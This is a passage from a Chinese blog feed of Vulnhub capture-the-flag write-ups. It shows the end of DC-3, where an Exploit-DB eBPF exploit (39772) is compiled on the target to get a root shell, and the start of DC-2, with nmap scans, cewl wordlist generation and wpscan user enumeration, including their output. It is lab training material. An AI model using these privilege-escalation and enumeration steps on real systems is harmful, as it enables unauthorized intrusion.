punctuation">(</span>gitlab.com<span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">224.0</span>.0.1<span class="token operator">|</span>:443<span class="token punctuation">..</span>. <span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.1.101:10808  <span class="token punctuation">..</span>.  gitlab.com:443  <span class="token punctuation">..</span>.  OK已连接。已发出 HTTP 请求，正在等待回应<span class="token punctuation">..</span>. <span class="token number">200</span> OK长度：7025 <span class="token punctuation">(</span><span class="token number">6</span>.9K<span class="token punctuation">)</span> <span class="token punctuation">[</span>application/octet-stream<span class="token punctuation">]</span>正在保存至: “39772.zip”<span class="token number">39772</span>.zip                <span class="token number">100</span>%<span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span><span class="token punctuation">]</span>   <span class="token number">6</span>.86K  --.-KB/s  用时 0s      <span class="token number">2023</span>-11-30 00:27:43 <span class="token punctuation">(</span><span class="token number">31.3</span> MB/s<span class="token punctuation">)</span> - 已保存 “39772.zip” <span class="token punctuation">[</span><span class="token number">7025</span>/7025<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下载到靶机后，就压39772.zip，crasher.tar，exploit.tar两个文件夹，解压exploit</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@DC-3:/var/www/html/templates/beez3/39772$ <span class="token function">tar</span> <span class="token parameter variable">-xvf</span> exploit.tar<span class="token function">tar</span> <span class="token parameter variable">-xvf</span> exploit.tarebpf_mapfd_doubleput_exploit/ebpf_mapfd_doubleput_exploit/hello.cebpf_mapfd_doubleput_exploit/suidhelper.cebpf_mapfd_doubleput_exploit/compile.shebpf_mapfd_doubleput_exploit/doubleput.cwww-data@DC-3:/var/www/html/templates/beez3/39772$ <span class="token function">ls</span><span class="token function">ls</span>crasher.tarebpf_mapfd_doubleput_exploitexploit.tarwww-data@DC-3:/var/www/html/templates/beez3/39772$ <span class="token builtin class-name">cd</span> ebpf_mapfd_doubleput_exploit<span class="token operator">&lt;</span>/templates/beez3/39772$ <span class="token builtin class-name">cd</span> ebpf_mapfd_doubleput_exploit                     <span class="token operator">&lt;</span>emplates/beez3/39772/ebpf_mapfd_doubleput_exploit$ <span class="token function">ls</span><span class="token function">ls</span>compile.shdoubleput.chello.csuidhelper.c<span class="token operator">&lt;</span>emplates/beez3/39772/ebpf_mapfd_doubleput_exploit$ ./compile.sh./compile.shdoubleput.c: In <span class="token keyword">function</span> <span class="token string">'make_setuid'</span><span class="token builtin class-name">:</span>doubleput.c:91:13: warning: cast from pointer to integer of different size <span class="token punctuation">[</span>-Wpointer-to-int-cast<span class="token punctuation">]</span>    .insns <span class="token operator">=</span> <span class="token punctuation">(</span>__aligned_u64<span class="token punctuation">)</span> insns,             ^doubleput.c:92:15: warning: cast from pointer to integer of different size <span class="token punctuation">[</span>-Wpointer-to-int-cast<span class="token punctuation">]</span>    .license <span class="token operator">=</span> <span class="token punctuation">(</span>__aligned_u64<span class="token punctuation">)</span><span class="token string">""</span>               ^<span class="token operator">&lt;</span>emplates/beez3/39772/ebpf_mapfd_doubleput_exploit$ ./doubleput./doubleputstarting writevwoohoo, got pointer reusewritev returned successfully. <span class="token keyword">if</span> this worked, you<span class="token string">'ll have a root shell in &lt;=60 seconds.suid file detected, launching rootshell...we have root privs now...iduid=0(root) gid=0(root) groups=0(root),33(www-data)find / -name "*flag*.txt"/root/the-flag.txtcat /root/the-flag.txt __        __   _ _   ____                   _ _ _ _  \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |  \ \ /\ / / _ \ | | | | | |/ _ \| '</span>_ <span class="token punctuation">\</span> / _ <span class="token punctuation">\</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>   <span class="token punctuation">\</span> V  V /  __/ <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __/_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>    <span class="token punctuation">\</span>_/<span class="token punctuation">\</span>_/ <span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>____/ <span class="token punctuation">\</span>___/<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token punctuation">(</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token punctuation">)</span>                                                     Congratulations are <span class="token keyword">in</span> order.  :-<span class="token punctuation">)</span>I hope you've enjoyed this challenge as I enjoyed making it.If there are any ways that I can improve these little challenges,please <span class="token builtin class-name">let</span> me know.As per usual, comments and complaints can be sent via Twitter to @DCAU7Have a great day<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="http://tuzk1.top/posts/5af3c5d0.html">Vulnhub靶机系列: DC-3 | Tuzk1</a></p>]]></content>
      
      
      <categories>
          
          <category> DC-3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-2</title>
      <link href="/2023/05/23/DC-2/"/>
      <url>/2023/05/23/DC-2/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><p>靶机下载地址<a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a>，下载导入vm ware，需要在hosts文件中添加域名解析</p><pre class="line-numbers language-none"><code class="language-none">127.0.0.1localhost127.0.1.1kali::1localhost ip6-localhost ip6-loopbackff02::1ip6-allnodesff02::2ip6-allrouters192.168.245.138dc-2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用nmap扫描，sn存活探测 –min-rate最小发包速率 -r关闭域名解析，确定靶机地址为192.168.245.138</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">192.168</span>.245.128/24 <span class="token parameter variable">-sn</span> --min-rate <span class="token number">2222</span> <span class="token parameter variable">-r</span>                 Starting Nmap <span class="token number">7.93</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2023</span>-11-22 07:27 ESTNmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.245.1Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0011s latency<span class="token punctuation">)</span>.Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.245.2Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00043s latency<span class="token punctuation">)</span>.Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.245.128Host is up <span class="token punctuation">(</span><span class="token number">0</span>.020s latency<span class="token punctuation">)</span>.Nmap scan report <span class="token keyword">for</span> dc-2 <span class="token punctuation">(</span><span class="token number">192.168</span>.245.138<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span><span class="token number">0</span>.019s latency<span class="token punctuation">)</span>.Nmap done: <span class="token number">256</span> IP addresses <span class="token punctuation">(</span><span class="token number">4</span> hosts up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.58</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>-p- 全端口扫描,–min-rate最小发包速率 -r关闭域名解析,-PN禁止ping其他主机，-sS TCP的SYN扫描，-oA输出文档</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">nmap <span class="token number">192.168</span><span class="token number">.245</span><span class="token number">.138</span> <span class="token operator">-</span>p<span class="token operator">-</span> <span class="token operator">--</span>min<span class="token operator">-</span>rate <span class="token number">2222</span> <span class="token operator">-</span>r <span class="token operator">-</span>PN <span class="token operator">-</span>sS <span class="token operator">-</span>oA scan_result<span class="token operator">/</span>sresult<span class="token punctuation">.</span>nmap<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> kali 的密码：Starting Nmap <span class="token number">7.93</span> <span class="token punctuation">(</span> https<span class="token operator">:</span><span class="token comment">//nmap.org ) at 2023-11-22 07:30 EST</span>Nmap scan report <span class="token keyword">for</span> dc<span class="token operator">-</span><span class="token number">2</span> <span class="token punctuation">(</span><span class="token number">192.168</span><span class="token number">.245</span><span class="token number">.138</span><span class="token punctuation">)</span>Host is <span class="token function">up</span> <span class="token punctuation">(</span><span class="token number">0.000094</span>s latency<span class="token punctuation">)</span><span class="token punctuation">.</span>Not shown<span class="token operator">:</span> <span class="token number">65533</span> closed tcp <span class="token function">ports</span> <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>PORT     STATE SERVICE<span class="token number">80</span><span class="token operator">/</span>tcp   open  http<span class="token number">7744</span><span class="token operator">/</span>tcp open  raqmon<span class="token operator">-</span>pduMAC Address<span class="token operator">:</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">0</span>C<span class="token operator">:</span><span class="token number">29</span><span class="token operator">:</span><span class="token number">92</span><span class="token operator">:</span>F8<span class="token operator">:</span><span class="token number">83</span> <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Nmap done<span class="token operator">:</span> <span class="token number">1</span> IP <span class="token function">address</span> <span class="token punctuation">(</span><span class="token number">1</span> host up<span class="token punctuation">)</span> scanned in <span class="token number">1.88</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有80和7744端口两个端口，看看web服务<br><img src="/2023/05/23/DC-2/image-20231128202827469.png"><br>WordPress 4.7.10，WordPress是一个以PHP和MySQL为平台的自由开源的博客软件和内容管理系统。WordPress具有插件架构和模板系统。截至2018年4月，排名前1000万的网站中超过30.6%使用WordPress。WordPress是最受欢迎的网站内容管理系统。全球有大约43%的网站都是使用WordPress架设网站的。[9]WordPress是目前因特网上最流行的博客系统。WordPress在最著名的网络发布阶段中脱颖而出。如今，它被使用在超过7000万个站点上。</p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>首页有Flag标签点击获取第一个flag</p><p><img src="/2023/05/23/DC-2/image-20231128202925691.png"><br>标志1：<br>你通常的单词表可能不起作用，所以，也许你需要cewl。<br>密码越多越好，但有时你无法赢得所有密码。<br>以一个身份登录以查看下一个标志。<br>如果找不到，请以其他身份登录。<br>CEWL 代表“自定义单词列表生成器”。它是一种用于网络安全和渗透测试的工具，用于根据目标网站的内容生成自定义单词列表。创建自定义单词列表的目的通常是执行密码攻击，其中该工具从网站中提取相关单词和短语以构建潜在密码列表。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">CeWL <span class="token number">5.5</span><span class="token number">.2</span>（分组）Robin <span class="token function">Wood</span><span class="token punctuation">(</span>robin@digi<span class="token punctuation">.</span>ninja<span class="token punctuation">)</span><span class="token punctuation">(</span>https<span class="token operator">:</span><span class="token comment">//digi.ninja/)</span>用法：cewl<span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span><span class="token operator">&lt;</span>url<span class="token operator">></span>选项：<span class="token operator">-</span>h、 <span class="token operator">--</span>help<span class="token operator">:</span>显示帮助。<span class="token operator">-</span>k、 <span class="token operator">--</span>keep：保留下载的文件。<span class="token operator">-</span>d＜x＞，<span class="token operator">--</span>depth＜x＞：蜘蛛到的深度，默认为<span class="token number">2</span>。<span class="token operator">-</span>m、 <span class="token operator">--</span>min_word_length：最小字长，默认为<span class="token number">3</span>。<span class="token operator">-</span>o、 <span class="token operator">--</span>异地：让蜘蛛访问其他站点。<span class="token operator">--</span>exclude：包含要排除的路径列表的文件<span class="token operator">--</span>allowed<span class="token operator">:</span>路径必须匹配才能遵循的正则表达式模式<span class="token operator">-</span>w、 <span class="token operator">--</span>write：将输出写入文件。<span class="token operator">-</span>u、 <span class="token operator">--</span>ua＜agent＞：要发送的用户代理。<span class="token operator">-</span>n、 <span class="token operator">--</span>无单词：不输出单词列表。<span class="token operator">-</span>g<span class="token operator">&lt;</span>x<span class="token operator">></span>，<span class="token operator">--</span>groups<span class="token operator">&lt;</span>x<span class="token operator">></span>：还返回单词组<span class="token operator">--</span>小写：所有已分析单词的小写<span class="token operator">--</span>带数字：接受带数字的单词，也可以只接受字母<span class="token operator">--</span>转换元音变音符：转换常见的ISO<span class="token operator">-</span><span class="token number">8859</span><span class="token operator">-</span><span class="token number">1</span>（Latin<span class="token operator">-</span><span class="token number">1</span>）元音变音符（ä<span class="token operator">-</span>ae，ö<span class="token operator">-</span>oe，ü<span class="token operator">-</span>ue，ß<span class="token operator">-</span>ss）<span class="token operator">-</span>a、 <span class="token operator">--</span>meta：包括元数据。<span class="token operator">--</span>meta_file文件：元数据的输出文件。<span class="token operator">-</span>e、 <span class="token operator">--</span>电子邮件：包括电子邮件地址。<span class="token operator">--</span>email_file＜file＞：电子邮件地址的输出文件。<span class="token operator">--</span>meta<span class="token operator">-</span>temp<span class="token operator">-</span>dir＜dir＞：exiftool在解析文件时使用的临时目录，默认<span class="token operator">/</span>tmp。<span class="token operator">-</span>c、 <span class="token operator">--</span>count：显示找到的每个单词的计数。<span class="token operator">-</span>v、 <span class="token operator">--</span>verbose：详细。<span class="token operator">--</span>debug：额外的调试信息。身份验证<span class="token operator">--</span>auth_type：摘要或基本。<span class="token operator">--</span>auth_user：身份验证用户名。<span class="token operator">--</span>auth_pass：身份验证密码。代理支持<span class="token operator">--</span>proxy_host：代理主机。<span class="token operator">--</span>proxy_port：代理端口，默认为<span class="token number">8080</span>。<span class="token operator">--</span>proxy_username：如果需要，代理的用户名。<span class="token operator">--</span>proxy_password：如果需要，代理的密码。页眉<span class="token operator">--</span>标头，<span class="token operator">-</span>H：格式为名称：值<span class="token operator">-</span>可以传递多个。＜url＞：蜘蛛的网站。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用cewl扫描账号密码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">cewl http<span class="token operator">:</span><span class="token comment">//dc-2 -w passwd.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过cewl获取到的字典，利用wpscan进行用户枚举，WPScan 是专为 WordPress 网站设计的安全扫描程序。它是一种开源工具，可帮助识别 WordPress 安装中的漏洞。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">用法：wpscan<span class="token punctuation">[</span>选项<span class="token punctuation">]</span><span class="token operator">--</span>url url要扫描的博客的url允许的协议：http、https默认协议（如果未提供）：http除非提供了更新或帮助或hh或版本，否则此选项是强制性的<span class="token operator">-</span>h、 <span class="token operator">--</span>help显示简单帮助并退出<span class="token operator">--</span>hh显示完整帮助并退出<span class="token operator">--</span>version显示版本并退出<span class="token operator">-</span>v、 <span class="token operator">--</span>详细详细模式<span class="token operator">--</span><span class="token punctuation">[</span>no<span class="token operator">-</span><span class="token punctuation">]</span>条幅是否显示条幅默认值：true<span class="token operator">-</span>o、 <span class="token operator">--</span>output FILE输出到FILE<span class="token operator">-</span>f、 <span class="token operator">--</span>format format以提供的格式输出结果可用选项：cli no color、cli、cli no color、json<span class="token operator">--</span>检测模式mode默认：混合可供选择：混合型、被动型、攻击型<span class="token operator">--</span>user<span class="token operator">-</span>agent，<span class="token operator">--</span>ua VALUE<span class="token operator">--</span>random<span class="token operator">-</span>user<span class="token operator">-</span>agent，<span class="token operator">--</span>rua每次扫描使用一个随机用户代理<span class="token operator">--</span>http auth<span class="token operator">-</span>login<span class="token operator">:</span>密码<span class="token operator">-</span>t、 <span class="token operator">--</span>最大线程数VALUE要使用的最大线程数默认值：<span class="token number">5</span><span class="token operator">--</span>throught毫秒在执行另一个web请求之前等待的毫秒。如果使用，最大线程数将设置为<span class="token number">1</span>。<span class="token operator">--</span>request timeout SECONDS请求超时（秒）默认值：<span class="token number">60</span><span class="token operator">--</span>connect timeout SECONDS连接超时（秒）默认值：<span class="token number">30</span><span class="token operator">--</span>disable<span class="token operator">-</span>tls checks禁用SSL<span class="token operator">/</span>tls证书验证，并降级到TLS1<span class="token punctuation">.</span><span class="token number">0</span><span class="token operator">+</span>（后者需要cURL <span class="token number">7.66</span>）<span class="token operator">--</span>proxy protocol<span class="token operator">:</span><span class="token comment">//IP:port支持的协议取决于安装的cURL</span><span class="token operator">--</span><span class="token operator">--</span>proxy<span class="token operator">-</span>auth login<span class="token operator">:</span>password 代理身份验证登录：密码<span class="token operator">--</span>cookie字符串要在请求中使用的cookie字符串，格式：cookie1<span class="token operator">=</span>value1<span class="token punctuation">[</span>；cookie2<span class="token operator">=</span>value2<span class="token punctuation">]</span><span class="token operator">--</span>cookie jar FILE<span class="token operator">-</span>PATH读取和写入cookie的文件默认值：<span class="token operator">/</span>tmp<span class="token operator">/</span>wpscan<span class="token operator">/</span>cookie_jar<span class="token punctuation">.</span>txt<span class="token operator">--</span>force不检查目标是否正在运行WordPress或返回<span class="token number">403</span><span class="token operator">--</span><span class="token punctuation">[</span>no<span class="token operator">-</span><span class="token punctuation">]</span>update是否更新数据库<span class="token operator">--</span>api<span class="token operator">-</span>token token显示漏洞数据的WPScan api令牌，可在https<span class="token operator">:</span><span class="token comment">//wpscan.com/profile</span><span class="token operator">--</span>wp<span class="token operator">-</span>content<span class="token operator">-</span>dirDIR如果自定义或未检测到wp<span class="token operator">-</span>content目录，例如“wp<span class="token operator">-</span>contente”<span class="token operator">--</span>wp<span class="token operator">-</span>plugins<span class="token operator">-</span>dirDIR插件目录，如果自定义或未检测到，例如“wp<span class="token operator">-</span>content<span class="token operator">/</span>plugins”<span class="token operator">-</span>e、 <span class="token operator">--</span>enumerate<span class="token punctuation">[</span>OPTS<span class="token punctuation">]</span>枚举过程可用参数：可用选项：vp易受攻击的插件ap所有插件p流行插件vt易受攻击的主题在所有主题t热门主题tt Timthumbscb配置备份dbe Db导出u用户ID范围。例如：u1<span class="token operator">-</span><span class="token number">5</span>要使用的范围分隔符：“<span class="token operator">-</span>”未提供参数时的值：<span class="token number">1</span><span class="token operator">-</span><span class="token number">10</span>m介质ID范围。例如m1<span class="token operator">-</span><span class="token number">15</span>注意：对于要检测的永久链接，必须将其设置为“普通”要使用的范围分隔符：“<span class="token operator">-</span>”未提供参数时的值：<span class="token number">1</span><span class="token operator">-</span><span class="token number">100</span>要在值之间使用的分隔符：“，”默认值：所有插件，配置备份未提供参数时的值：vp、vt、tt、cb、dbe、u、m不兼容的选项（每组只能使用一个）：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以通过wpscan获取用户名字典</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">wpscan <span class="token operator">--</span>url http<span class="token operator">:</span><span class="token comment">//dc-2 --enumerate u </span>$ wpscan <span class="token operator">--</span>url http<span class="token operator">:</span><span class="token comment">//dc-2 --enumerate u</span>_______________________________________________________________         __          _______   _____         \ \        <span class="token operator">/</span> <span class="token operator">/</span>  __ \ <span class="token operator">/</span> ____<span class="token operator">|</span>          \ \  <span class="token operator">/</span>\  <span class="token operator">/</span> <span class="token operator">/</span><span class="token operator">|</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>___   ___  __ _ _ __ ®           \ \<span class="token operator">/</span>  \<span class="token operator">/</span> <span class="token operator">/</span> <span class="token operator">|</span>  ___<span class="token operator">/</span> \___ \ <span class="token operator">/</span> __<span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> '_ \            \  <span class="token operator">/</span>\  <span class="token operator">/</span>  <span class="token operator">|</span> <span class="token operator">|</span>     ____<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>             \<span class="token operator">/</span>  \<span class="token operator">/</span>   <span class="token operator">|</span>_<span class="token operator">|</span>    <span class="token operator">|</span>_____<span class="token operator">/</span> \___<span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>         WordPress Security Scanner by the WPScan Team                         Version <span class="token number">3.8</span><span class="token number">.22</span>                                      @_WPScan_<span class="token punctuation">,</span> @ethicalhack3r<span class="token punctuation">,</span> @erwan_lr<span class="token punctuation">,</span> @firefart_______________________________________________________________<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Updating the Database <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> Update completed<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> URL<span class="token operator">:</span> http<span class="token operator">:</span><span class="token comment">//dc-2/ [192.168.245.138]</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Started<span class="token operator">:</span> Thu Nov <span class="token number">23</span> <span class="token number">07</span><span class="token operator">:</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">49</span> <span class="token number">2023</span>Interesting <span class="token function">Finding</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Headers <span class="token operator">|</span> Interesting Entry<span class="token operator">:</span> Server<span class="token operator">:</span> Apache<span class="token operator">/</span><span class="token number">2.4</span><span class="token number">.10</span> <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span> <span class="token operator">|</span> Found By<span class="token operator">:</span> <span class="token function">Headers</span> <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span> <span class="token operator">|</span> Confidence<span class="token operator">:</span> <span class="token number">100</span><span class="token operator">%</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> XML<span class="token operator">-</span>RPC seems to be enabled<span class="token operator">:</span> http<span class="token operator">:</span><span class="token comment">//dc-2/xmlrpc.php</span> <span class="token operator">|</span> Found By<span class="token operator">:</span> Direct <span class="token function">Access</span> <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span> <span class="token operator">|</span> Confidence<span class="token operator">:</span> <span class="token number">100</span><span class="token operator">%</span> <span class="token operator">|</span> References<span class="token operator">:</span> <span class="token operator">|</span>  <span class="token operator">-</span> http<span class="token operator">:</span><span class="token comment">//codex.wordpress.org/XML-RPC_Pingback_API</span> <span class="token operator">|</span>  <span class="token operator">-</span> https<span class="token operator">:</span><span class="token comment">//www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span> <span class="token operator">|</span>  <span class="token operator">-</span> https<span class="token operator">:</span><span class="token comment">//www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span> <span class="token operator">|</span>  <span class="token operator">-</span> https<span class="token operator">:</span><span class="token comment">//www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span> <span class="token operator">|</span>  <span class="token operator">-</span> https<span class="token operator">:</span><span class="token comment">//www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> WordPress readme found<span class="token operator">:</span> http<span class="token operator">:</span><span class="token comment">//dc-2/readme.html</span> <span class="token operator">|</span> Found By<span class="token operator">:</span> Direct <span class="token function">Access</span> <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span> <span class="token operator">|</span> Confidence<span class="token operator">:</span> <span class="token number">100</span><span class="token operator">%</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> The external WP<span class="token operator">-</span>Cron seems to be enabled<span class="token operator">:</span> http<span class="token operator">:</span><span class="token comment">//dc-2/wp-cron.php</span> <span class="token operator">|</span> Found By<span class="token operator">:</span> Direct <span class="token function">Access</span> <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span> <span class="token operator">|</span> Confidence<span class="token operator">:</span> <span class="token number">60</span><span class="token operator">%</span> <span class="token operator">|</span> References<span class="token operator">:</span> <span class="token operator">|</span>  <span class="token operator">-</span> https<span class="token operator">:</span><span class="token comment">//www.iplocation.net/defend-wordpress-from-ddos</span> <span class="token operator">|</span>  <span class="token operator">-</span> https<span class="token operator">:</span><span class="token comment">//github.com/wpscanteam/wpscan/issues/1299</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> WordPress version <span class="token number">4.7</span><span class="token number">.10</span> <span class="token function">identified</span> <span class="token punctuation">(</span>Insecure<span class="token punctuation">,</span> released on <span class="token number">2018</span><span class="token operator">-</span><span class="token number">04</span><span class="token operator">-</span><span class="token number">03</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token operator">|</span> Found By<span class="token operator">:</span> Rss <span class="token function">Generator</span> <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span> <span class="token operator">|</span>  <span class="token operator">-</span> http<span class="token operator">:</span><span class="token comment">//dc-2/index.php/feed/, &lt;generator>https://wordpress.org/?v=4.7.10&lt;/generator></span> <span class="token operator">|</span>  <span class="token operator">-</span> http<span class="token operator">:</span><span class="token comment">//dc-2/index.php/comments/feed/, &lt;generator>https://wordpress.org/?v=4.7.10&lt;/generator></span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> WordPress theme in use<span class="token operator">:</span> twentyseventeen <span class="token operator">|</span> Location<span class="token operator">:</span> http<span class="token operator">:</span><span class="token comment">//dc-2/wp-content/themes/twentyseventeen/</span> <span class="token operator">|</span> Last Updated<span class="token operator">:</span> <span class="token number">2023</span><span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">07</span>T00<span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">00.000</span>Z <span class="token operator">|</span> Readme<span class="token operator">:</span> http<span class="token operator">:</span><span class="token comment">//dc-2/wp-content/themes/twentyseventeen/README.txt</span> <span class="token operator">|</span> <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> The version is out of date<span class="token punctuation">,</span> the latest version is <span class="token number">3.4</span> <span class="token operator">|</span> Style URL<span class="token operator">:</span> http<span class="token operator">:</span><span class="token comment">//dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10</span> <span class="token operator">|</span> Style Name<span class="token operator">:</span> Twenty Seventeen <span class="token operator">|</span> Style URI<span class="token operator">:</span> https<span class="token operator">:</span><span class="token comment">//wordpress.org/themes/twentyseventeen/</span> <span class="token operator">|</span> Description<span class="token operator">:</span> Twenty Seventeen brings your site to life with header video and immersive featured images<span class="token punctuation">.</span> With a fo<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token 